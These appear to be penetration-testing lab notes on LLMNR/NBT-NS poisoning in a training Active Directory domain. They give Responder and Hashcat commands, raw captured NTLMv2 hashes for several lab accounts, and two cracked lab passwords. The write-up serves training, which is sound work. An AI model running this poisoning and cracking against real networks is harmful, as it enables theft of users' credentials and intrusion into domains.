---
description: >-
  Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and
  NetBIOS Name Service (NBT-NS) broadcasts
---

# LLMNR/NBT-NS Poisoning - from Linux

## Over view

At this point we found

* group and user info
* naming scheme used for domain
* critical services and roles like DC

Next we will try to acquire valid cleartext credentials for domain user account (getting foothold).

## LLMNR & NBT-NS

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. Usually when DNS fails, the machine will try to ask all machines on local network via LLMNR.

LLMNR is based on DNS format and allows hosts on local network to perform name resolution for other hosts. It uses port 5355 over UDP. If LLMNR also fails then NBT-NS will be used.

NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

### Quick Example - LLMNR/NBT-NS Poisoning

1. A host attempts to connect to the print server at \\\print01.inlanefreight.local, but accidentally types in \\\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

<table data-header-hidden><thead><tr><th width="133"></th><th></th></tr></thead><tbody><tr><td><strong>Tool</strong></td><td><strong>Description</strong></td></tr><tr><td><a href="https://github.com/lgandx/Responder">Responder</a></td><td>Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.</td></tr><tr><td><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td><td>Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.</td></tr><tr><td><a href="https://www.metasploit.com/">Metasploit</a></td><td>Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.</td></tr></tbody></table>

**Starting Responder with Default Settings**

```bash
sudo responder -I ens224 
```

usually we let responder run while performing other task to maximize the number of hashes. Once done we can use Hashcat mode 5600 to crack NTLMv2 hashes. if other types of hashes are obtained then check out other modes correspondingly.

**Cracking an NTLMv2 Hash With Hashcat**

```shell-session
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

## Assessment

ran responder and found the following.

```
sudo responder -I ens224 
```

<pre><code>[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:708863d9e8cc0844:BD423BB3321B30A1E9F2BB47E02EFEDA:01010000000000007F801D446BADD90122C77CA067ED41DF000000000200080058004A004100330001001E00570049004E002D00460050003600520058003000550043004200570048000400140058004A00410033002E004C004F00430041004C0003003400570049004E002D00460050003600520058003000550043004200570048002E0058004A00410033002E004C004F00430041004C000500140058004A00410033002E004C004F00430041004C00080030003000000000000000000000000030000071256626440CE4E6AEBD4065D76795F28E9CDD4FEA26D3F0F3922800456DED530A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000
<strong>
</strong><strong>[SMB] NTLMv2-SSP Client   : 172.16.5.130
</strong>[SMB] NTLMv2-SSP Username : INLANEFREIGHT\lab_adm
[SMB] NTLMv2-SSP Hash     : lab_adm::INLANEFREIGHT:49d9df6bc546ebd1:B5D9A872182B2A49B6AC3692292B77AE:010100000000000080D372BC49ADD901C1D01D60B982D62B000000000200080058004A004100330001001E00570049004E002D004600500036005200580030005500430042005700480004003400570049004E002D00460050003600520058003000550043004200570048002E0058004A00410033002E004C004F00430041004C000300140058004A00410033002E004C004F00430041004C000500140058004A00410033002E004C004F00430041004C000700080080D372BC49ADD9010600040002000000080030003000000000000000000000000030000071256626440CE4E6AEBD4065D76795F28E9CDD4FEA26D3F0F3922800456DED530A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\svc_qualys
[SMB] NTLMv2-SSP Hash     : svc_qualys::INLANEFREIGHT:97668f541b2a90bc:398C5764629939944F3FDE930F7C5971:010100000000000080D372BC49ADD901BF8BDB2544EBE7CD000000000200080058004A004100330001001E00570049004E002D004600500036005200580030005500430042005700480004003400570049004E002D00460050003600520058003000550043004200570048002E0058004A00410033002E004C004F00430041004C000300140058004A00410033002E004C004F00430041004C000500140058004A00410033002E004C004F00430041004C000700080080D372BC49ADD9010600040002000000080030003000000000000000000000000030000071256626440CE4E6AEBD4065D76795F28E9CDD4FEA26D3F0F3922800456DED530A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
[SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:95b3f81741397236:25CF6D94EA7474E17AE68BE0B3EAC919:010100000000000080D372BC49ADD90148C9D6F0EBC5E616000000000200080058004A004100330001001E00570049004E002D004600500036005200580030005500430042005700480004003400570049004E002D00460050003600520058003000550043004200570048002E0058004A00410033002E004C004F00430041004C000300140058004A00410033002E004C004F00430041004C000500140058004A00410033002E004C004F00430041004C000700080080D372BC49ADD9010600040002000000080030003000000000000000000000000030000071256626440CE4E6AEBD4065D76795F28E9CDD4FEA26D3F0F3922800456DED530A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:07391f3be62905e5:88D31C5D8B13D3C79A3CA43C5A38094B:010100000000000080D372BC49ADD901E7809F717B762EF1000000000200080058004A004100330001001E00570049004E002D004600500036005200580030005500430042005700480004003400570049004E002D00460050003600520058003000550043004200570048002E0058004A00410033002E004C004F00430041004C000300140058004A00410033002E004C004F00430041004C000500140058004A00410033002E004C004F00430041004C000700080080D372BC49ADD9010600040002000000080030003000000000000000000000000030000071256626440CE4E6AEBD4065D76795F28E9CDD4FEA26D3F0F3922800456DED530A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:612273b509b64d80:40FB388B572E8FFA57AA558FF171322B:010100000000000080D372BC49ADD901F0F2EF04DCCEF2D7000000000200080058004A004100330001001E00570049004E002D004600500036005200580030005500430042005700480004003400570049004E002D00460050003600520058003000550043004200570048002E0058004A00410033002E004C004F00430041004C000300140058004A00410033002E004C004F00430041004C000500140058004A00410033002E004C004F00430041004C000700080080D372BC49ADD9010600040002000000080030003000000000000000000000000030000071256626440CE4E6AEBD4065D76795F28E9CDD4FEA26D3F0F3922800456DED530A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\forend
[SMB] NTLMv2-SSP Hash     : forend::INLANEFREIGHT:fa1868cd14805f3e:7B90319EE924F97C256E9DF2BF321FD6:010100000000000080D372BC49ADD90186E81E1B9B4BC804000000000200080058004A004100330001001E00570049004E002D004600500036005200580030005500430042005700480004003400570049004E002D00460050003600520058003000550043004200570048002E0058004A00410033002E004C004F00430041004C000300140058004A00410033002E004C004F00430041004C000500140058004A00410033002E004C004F00430041004C000700080080D372BC49ADD9010600040002000000080030003000000000000000000000000030000071256626440CE4E6AEBD4065D76795F28E9CDD4FEA26D3F0F3922800456DED530A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
</code></pre>

<figure><img src="../../../.gitbook/assets/image (4) (2) (1).png" alt=""><figcaption><p>backupagent:h1backup55</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption><p>WLEY:transporter@4</p></figcaption></figure>











